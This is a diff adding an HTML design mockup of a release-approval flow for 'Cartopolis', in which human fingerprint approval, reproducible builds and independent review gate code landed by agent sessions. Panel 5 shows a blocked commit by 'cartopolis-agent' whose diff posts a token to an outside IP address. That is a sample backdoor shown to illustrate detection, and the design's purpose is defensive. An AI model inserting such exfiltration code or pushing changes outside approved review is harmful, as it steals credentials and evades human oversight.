@@ -1,0 +1,282 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Releases you approve with your fingerprint — v1</title>
+<style>
+@font-face { font-family: 'Plus Jakarta Sans'; font-weight: 400; src: url('../../../assets/fonts/PlusJakartaSans-Regular.ttf'); }
+@font-face { font-family: 'Plus Jakarta Sans'; font-weight: 600 700; src: url('../../../assets/fonts/PlusJakartaSans-SemiBold.ttf'); }
+/* systems::theme */
+:root {
+  --ink:#0f1416; --glass:rgba(30,50,51,.92); --glass-core:rgba(30,50,51,.96); --rim:#2b5150;
+  --accent:#5cc6c0; --accent-muted:#263f42; --brand:#fd6012;
+  --text:#e2e9ea; --dim:#aac2c6; --line:rgba(255,255,255,.14);
+  --ok:#6fcf8e; --warn:#f2b84b; --bad:#ef6a5a;
+}
+* { box-sizing:border-box; }
+body { margin:0; padding:36px; background:#0d1214; font-family:'Plus Jakarta Sans',system-ui,sans-serif; color:var(--text);
+       display:grid; grid-template-columns:repeat(4, 400px); gap:44px 36px; }
+.col { display:flex; flex-direction:column; gap:12px; }
+.wide { grid-column:span 2; }
+.col h2 { margin:0; font-size:20px; font-weight:600; color:#fff; }
+.col h2 .new { font-size:11px; font-weight:700; background:var(--brand); color:#fff; border-radius:6px; padding:2px 7px; margin-left:8px; vertical-align:3px; }
+.col > p { margin:0; font-size:14px; color:var(--dim); line-height:1.45; }
+svg.i { width:20px; height:20px; fill:none; stroke:currentColor; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; flex:none; }
+
+.phone { width:400px; height:820px; border-radius:34px; overflow:hidden; position:relative; background:var(--ink);
+         box-shadow:0 0 0 8px #050708, 0 24px 60px -20px #000; display:flex; flex-direction:column; }
+.phone.map { background:url('../app-updates/map.png') center/cover; }
+.status { height:30px; flex:none; }
+
+/* an app panel: header, scrolling body, fixed foot */
+.head { display:flex; align-items:center; gap:10px; padding:10px 18px 12px; border-bottom:1px solid var(--line); }
+.head b { font-size:18px; font-weight:600; color:#fff; flex:1; }
+.head .x { color:var(--dim); }
+.body { flex:1; overflow:hidden; padding:14px 18px; display:flex; flex-direction:column; gap:14px; }
+.foot { padding:14px 18px 22px; border-top:1px solid var(--line); display:flex; flex-direction:column; gap:8px; }
+.sub { font-size:12px; font-weight:700; letter-spacing:.06em; text-transform:uppercase; color:var(--dim); margin-top:4px; }
+.ver { font-size:13px; color:var(--dim); }
+.ver b { color:#fff; font-weight:600; }
+
+.change { display:flex; flex-direction:column; gap:3px; padding:10px 12px; background:var(--glass); border:1px solid var(--rim); border-radius:12px; }
+.change b { font-size:14px; color:#fff; font-weight:600; }
+.change span { font-size:13px; color:var(--dim); line-height:1.4; }
+.change small { font-size:11.5px; color:var(--dim); opacity:.75; }
+
+.check { display:flex; gap:10px; align-items:flex-start; font-size:13.5px; line-height:1.35; }
+.check .s { width:22px; height:22px; border-radius:11px; display:grid; place-items:center; flex:none; font-size:13px; font-weight:700; color:var(--ink); }
+.check.ok .s { background:var(--ok); } .check.warn .s { background:var(--warn); } .check.bad .s { background:var(--bad); }
+.check small { display:block; font-size:12px; color:var(--dim); }
+
+.flag { border:1px solid rgba(242,184,75,.45); background:rgba(242,184,75,.08); border-radius:12px; padding:10px 12px; display:flex; flex-direction:column; gap:6px; }
+.flag .t { display:flex; gap:8px; align-items:center; font-size:14px; font-weight:600; color:#fff; }
+.flag .t i { font-style:normal; color:var(--warn); }
+.flag p { margin:0; font-size:12.5px; color:var(--dim); line-height:1.4; }
+pre { margin:0; background:#081012; border-radius:8px; padding:8px 10px; font-size:11px; line-height:1.45; color:#cfe; white-space:pre-wrap; font-family:ui-monospace,Menlo,monospace; }
+pre .a { color:var(--ok); }
+.read { font-size:12.5px; color:var(--accent); font-weight:600; }
+
+.btn { background:var(--accent); color:var(--ink); font-weight:700; font-size:16px; border-radius:14px; padding:14px; display:flex; gap:8px; align-items:center; justify-content:center; }
+.btn.off { background:var(--accent-muted); color:var(--dim); }
+.ghost { color:var(--dim); font-size:14px; text-align:center; padding:6px; }
+
+/* the pill on the map */
+.notice { position:absolute; top:46px; left:50%; transform:translateX(-50%); display:flex; align-items:center; gap:10px; width:360px;
+          background:var(--glass); border:1px solid var(--rim); border-radius:24px; padding:7px 7px 7px 14px; box-shadow:0 8px 24px -8px rgba(0,0,0,.6); }
+.notice .t { display:flex; flex-direction:column; line-height:1.2; flex:1; }
+.notice b { font-size:14px; font-weight:600; color:#fff; } .notice small { font-size:12px; color:var(--dim); }
+.notice .btn { font-size:14px; padding:8px 14px; border-radius:18px; }
+.tap { position:absolute; width:44px; height:44px; border-radius:50%; border:3px solid #fff; background:rgba(255,255,255,.25); box-shadow:0 0 0 6px rgba(255,255,255,.12); }
+
+/* Android's own biometric sheet */
+.veil { position:absolute; inset:0; background:rgba(0,0,0,.55); }
+.sheet { position:absolute; left:0; right:0; bottom:0; background:#1d2324; border-radius:26px 26px 0 0; padding:26px 26px 30px; display:flex; flex-direction:column; align-items:center; gap:10px; text-align:center; }
+.sheet h3 { margin:0; font-size:20px; font-weight:600; color:#fff; }
+.sheet p { margin:0; font-size:14px; color:var(--dim); line-height:1.45; }
+.fp { width:64px; height:64px; border-radius:32px; border:2px solid var(--accent); display:grid; place-items:center; color:var(--accent); margin:12px 0 4px; }
+.fp svg.i { width:36px; height:36px; }
+.sheet .cancel { align-self:flex-start; color:var(--accent); font-size:14px; font-weight:600; margin-top:8px; }
+.sys { font-size:10.5px; color:var(--dim); opacity:.7; position:absolute; bottom:8px; right:14px; }
+
+/* the server's web Admin page */
+.browser { width:836px; height:520px; border-radius:14px; overflow:hidden; background:#f4f6f6; color:#16201f; box-shadow:0 0 0 6px #050708, 0 24px 60px -20px #000; display:flex; flex-direction:column; }
+.chrome { height:34px; background:#dfe5e5; display:flex; align-items:center; padding:0 14px; gap:8px; font-size:12px; color:#4b5a59; }
+.chrome .url { background:#fff; border-radius:8px; padding:4px 12px; flex:1; }
+.page { display:flex; flex:1; }
+.side { width:170px; background:#e9eeee; padding:18px 14px; display:flex; flex-direction:column; gap:6px; font-size:14px; }
+.side .on { background:#fff; border-radius:8px; padding:6px 10px; font-weight:600; } .side div { padding:6px 10px; color:#4b5a59; }
+.main { flex:1; padding:22px 26px; display:flex; flex-direction:column; gap:14px; }
+.main h1 { margin:0; font-size:22px; font-weight:600; }
+.banner { border:1px solid #9fd8d4; background:#e6f6f5; border-radius:12px; padding:14px 16px; display:flex; flex-direction:column; gap:8px; }
+.banner .t { display:flex; align-items:center; gap:10px; font-weight:600; font-size:15.5px; }
+.banner p { margin:0; font-size:13.5px; color:#3d4c4b; line-height:1.45; }
+.banner ul { margin:0; padding-left:18px; font-size:13.5px; color:#3d4c4b; line-height:1.5; }
+.banner .row { display:flex; gap:10px; align-items:center; }
+.wbtn { background:#2f8f89; color:#fff; font-weight:700; font-size:14px; border-radius:10px; padding:9px 16px; }
+.wghost { color:#2f8f89; font-weight:600; font-size:14px; }
+.kv { display:grid; grid-template-columns:150px 1fr; gap:6px 12px; font-size:13.5px; }
+.kv span:nth-child(odd) { color:#5d6c6b; }
+.seal { display:inline-flex; gap:6px; align-items:center; font-size:12.5px; color:#2f6f3f; background:#e3f3e7; border-radius:8px; padding:3px 8px; }
+.prog { height:8px; border-radius:4px; background:#cfe7e5; overflow:hidden; } .prog i { display:block; height:100%; width:64%; background:#2f8f89; }
+.steps { font-size:13px; color:#3d4c4b; line-height:1.7; }
+.steps .d { color:#2f6f3f; } .steps .n { color:#8a9796; }
+</style></head><body>
+
+<!-- 1 -->
+<div class="col">
+  <h2>1 · A release is waiting<span class="new">new</span></h2>
+  <p>Only on the phone that holds the release key. A session or the deploy has staged a build; the app says so at the top. Nothing is published yet.</p>
+  <div class="phone map">
+    <div class="notice">
+      <svg class="i" viewBox="0 0 24 24" style="color:var(--accent)"><path d="M12 3l7 3v6c0 4.5-3 8-7 9-4-1-7-4.5-7-9V6z"/><path d="M9 12l2 2 4-4"/></svg>
+      <div class="t"><b>Release waiting for you</b><small>Server + app · build 22140 · 9 changes</small></div>
+      <div class="btn">Review</div>
+    </div>
+    <div class="tap" style="top:52px; left:316px"></div>
+  </div>
+</div>
+
+<!-- 2 -->
+<div class="col">
+  <h2>2 · What changes, and the checks<span class="new">new</span></h2>
+  <p>Every change since the last release you approved, in the words its landing was put to you in. Below, the checks a machine can do; all green is the normal case.</p>
+  <div class="phone">
+    <div class="status"></div>
+    <div class="head"><b>Release 22140</b><span class="x"><svg class="i" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></span></div>
+    <div class="body">
+      <div class="ver">Server and app · after <b>22101</b> (approved 4 Nov)</div>
+      <div class="sub">What changes · 9</div>
+      <div class="change"><b>Install your own server with one line</b><span>A Linux server and a domain name are enough: one command asks the address and an admin.</span><small>landed 12 Nov · you said "Land it"</small></div>
+      <div class="change"><b>Sign in with other accounts</b><span>Google, GitHub and four others, once their apps are registered.</span><small>landed 11 Nov · you said "Land it"</small></div>
+      <div class="change"><b>Overcast is duller than a clear noon</b><span>The sky under thick cloud no longer looks brighter than sun.</span><small>landed 12 Nov · you said "Land it"</small></div>
+      <div class="read">and 6 more ›</div>
+      <div class="sub">Checks</div>
+      <div class="check ok"><span class="s">✓</span><div>Every change on main came through a landing you approved<small>9 of 9 commits; none appeared any other way</small></div></div>
+      <div class="check ok"><span class="s">✓</span><div>Two machines built the same files<small>mac-1 and vps-1 agree on every checksum</small></div></div>
+      <div class="check ok"><span class="s">✓</span><div>Ran on cartopolis.org for 31 hours<small>0 crashes · 0 restarts · talked only to its known addresses</small></div></div>
+      <div class="check ok"><span class="s">✓</span><div>No known vulnerabilities in its dependencies</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- 3 -->
+<div class="col">
+  <h2>3 · What needs your eyes<span class="new">new</span></h2>
+  <p>The parts of the change a backdoor would need, pulled out of the whole and shown in full: here a database change and a new dependency. You read these lines, not the 4,000 others.</p>
+  <div class="phone">
+    <div class="status"></div>
+    <div class="head"><b>Release 22140</b><span class="x"><svg class="i" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></span></div>
+    <div class="body">
+      <div class="sub">Needs your eyes · 2</div>
+      <div class="flag">
+        <div class="t"><i>⚠</i>Database change (cannot be undone)</div>
+        <p>V44: remember where an account last stood. Adds two columns; removes nothing.</p>
+<pre><span class="a">+ ALTER TABLE accounts ADD COLUMN last_lat REAL;
++ ALTER TABLE accounts ADD COLUMN last_lng REAL;</span></pre>
+      </div>
+      <div class="flag">
+        <div class="t"><i>⚠</i>New dependency</div>
+        <p><b>rpassword 7.5.5</b> — reads a password at a terminal without showing it. Shown: what it is for, who publishes it, and whether it can reach the network or run programs.</p>
+      </div>
+      <div class="sub">Independent review</div>
+      <div class="check ok"><span class="s">✓</span><div>No findings<small>a reviewer that wrote none of it read all 9 changes, looking for hidden behaviour</small></div></div>
+      <div class="sub">What you sign</div>
+      <div class="check ok"><span class="s">✓</span><div>This phone downloaded and checked the files itself<small>server 16.1 MB · app 81.4 MB · sha256 f8aa7b30… e1c2…</small></div></div>
+    </div>
+    <div class="foot">
+      <div class="btn"><svg class="i" viewBox="0 0 24 24"><path d="M12 11c0 3-1 6-3 8M8 6.5A6 6 0 0118 11c0 2-.3 4-1 6M6 10a6 6 0 00-.5 2.5c0 1.5-.3 3-1 4.5M12 15c0 1.5-.5 3-1.5 4.5M15 13.5c0 2-.4 3.8-1.2 5.5"/></svg>Approve with fingerprint</div>
+      <div class="ghost">Not now</div>
+    </div>
+  </div>
+</div>
+
+<!-- 4 -->
+<div class="col">
+  <h2>4 · Your fingerprint signs it<span class="new">new</span></h2>
+  <p>Android's own sheet, not the app's: the key sits in the phone's security chip and signs only after a strong biometric. A PIN does not count, and no session driving the app can touch it.</p>
+  <div class="phone">
+    <div class="status"></div>
+    <div class="head"><b>Release 22140</b></div>
+    <div class="body"></div>
+    <div class="veil"></div>
+    <div class="sheet">
+      <h3>Approve Cartopolis release 22140</h3>
+      <p>Server 16.1 MB and app 81.4 MB, as checked on this phone. Publishing it lets every server and phone install it.</p>
+      <div class="fp"><svg class="i" viewBox="0 0 24 24"><path d="M12 11c0 3-1 6-3 8M8 6.5A6 6 0 0118 11c0 2-.3 4-1 6M6 10a6 6 0 00-.5 2.5c0 1.5-.3 3-1 4.5M12 15c0 1.5-.5 3-1.5 4.5M15 13.5c0 2-.4 3.8-1.2 5.5"/></svg></div>
+      <p>Touch the fingerprint sensor</p>
+      <div class="cancel">Cancel</div>
+    </div>
+    <div class="sys">Android system dialog</div>
+  </div>
+</div>
+
+<!-- 5 -->
+<div class="col">
+  <h2>5 · When a check fails, there is no button<span class="new">new</span></h2>
+  <p>A change that reached main without your yes, or two builds that disagree, is not something to weigh: approval is off until it is explained.</p>
+  <div class="phone">
+    <div class="status"></div>
+    <div class="head"><b>Release 22140</b><span class="x"><svg class="i" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></span></div>
+    <div class="body">
+      <div class="sub">Checks</div>
+      <div class="check bad"><span class="s">!</span><div>1 change on main did not come through a landing you approved<small>3f9e21c "chore: tidy imports", pushed 12 Nov 03:12 by cartopolis-agent, in no session</small></div></div>
+      <div class="check ok"><span class="s">✓</span><div>Two machines built the same files</div></div>
+      <div class="check ok"><span class="s">✓</span><div>Ran on cartopolis.org for 31 hours</div></div>
+<pre><span class="a">+ let _ = ureq::post("https://198.51.100.7/c")
++     .send_string(&token);</span></pre>
+      <p style="margin:0;font-size:13px;color:var(--dim);line-height:1.45">Its diff is shown in full. Approval stays off until the commit is removed from main, or landed again through a session you answer.</p>
+    </div>
+    <div class="foot">
+      <div class="btn off">Approve with fingerprint</div>
+      <div class="ghost">Ask a session to look into it</div>
+    </div>
+  </div>
+</div>
+
+<!-- 6 -->
+<div class="col">
+  <h2>6 · Signed and published<span class="new">new</span></h2>
+  <p>The signature goes to the hub, which publishes the files with it. Every server and phone checks it against the key they were built with before installing anything.</p>
+  <div class="phone">
+    <div class="status"></div>
+    <div class="head"><b>Release 22140</b><span class="x"><svg class="i" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></span></div>
+    <div class="body" style="align-items:center;text-align:center;justify-content:center;gap:12px">
+      <div class="fp" style="border-color:var(--ok);color:var(--ok)"><svg class="i" viewBox="0 0 24 24"><path d="M5 12l5 5 9-10"/></svg></div>
+      <b style="font-size:19px;color:#fff">Approved and published</b>
+      <div class="ver">Signed on this phone at 14:02<br>cartopolis.org/server · cartopolis.org/apk</div>
+      <div class="ver" style="margin-top:12px">Servers see it on their Admin page within 6 hours; phones when they next open the app.</div>
+    </div>
+  </div>
+</div>
+
+<!-- 7 -->
+<div class="col wide">
+  <h2>7 · A server's admin is told, and installs with one click<span class="new">new</span></h2>
+  <p>On the Admin page of every self-hosted server. The server has already downloaded the update and checked your signature; <b>Install</b> tests it on a copy of the database, switches over and restarts. Nothing happens until an admin clicks.</p>
+  <div class="browser">
+    <div class="chrome"><span>●●●</span><span class="url">https://maps.example.org/admin</span></div>
+    <div class="page">
+      <div class="side"><div class="on">Overview</div><div>Accounts</div><div>Reports</div><div>Data</div></div>
+      <div class="main">
+        <h1>Overview</h1>
+        <div class="banner">
+          <div class="t"><svg class="i" viewBox="0 0 24 24" style="color:#2f8f89"><path d="M12 4v11M7 10l5 5 5-5M5 20h14"/></svg>Cartopolis server 22140 is ready to install</div>
+          <span class="seal">✓ approved by the Cartopolis maintainer on 12 Nov · signature checked by this server</span>
+          <ul>
+            <li>Install your own server with one line</li>
+            <li>Sign in with other accounts</li>
+            <li>One database change: remembers where an account last stood</li>
+          </ul>
+          <div class="row"><span class="wbtn">Install</span><span class="wghost">All 9 changes</span><span style="font-size:12.5px;color:#5d6c6b">The server is away for about 20 seconds.</span></div>
+        </div>
+        <div class="kv"><span>This server</span><span>build 22101 · since 4 Nov</span><span>Players online</span><span>3</span><span>Map data</span><span>Groningen · made 10 Nov</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 8 -->
+<div class="col wide">
+  <h2>8 · Installing, and what happened<span class="new">new</span></h2>
+  <p>Each step as it happens. If the new version does not come up, the server puts the old one and its database back by itself and says so here; the old version stays one click away for a week.</p>
+  <div class="browser">
+    <div class="chrome"><span>●●●</span><span class="url">https://maps.example.org/admin</span></div>
+    <div class="page">
+      <div class="side"><div class="on">Overview</div><div>Accounts</div><div>Reports</div><div>Data</div></div>
+      <div class="main">
+        <h1>Overview</h1>
+        <div class="banner">
+          <div class="t">Installing Cartopolis server 22140</div>
+          <div class="prog"><i></i></div>
+          <div class="steps">
+            <div class="d">✓ Signature checked (maintainer key, signed 12 Nov 14:02)</div>
+            <div class="d">✓ Database copied to previous/ (212 MB)</div>
+            <div class="d">✓ New version tested on a copy of the database: 1 change applied</div>
+            <div class="d">✓ Switched over; restarting</div>
+            <div class="n">○ Waiting for the new version to answer</div>
+          </div>
+        </div>
+        <div class="kv"><span>Previous version</span><span>build 22101, kept until 19 Nov · <span class="wghost">Go back</span></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body></html>
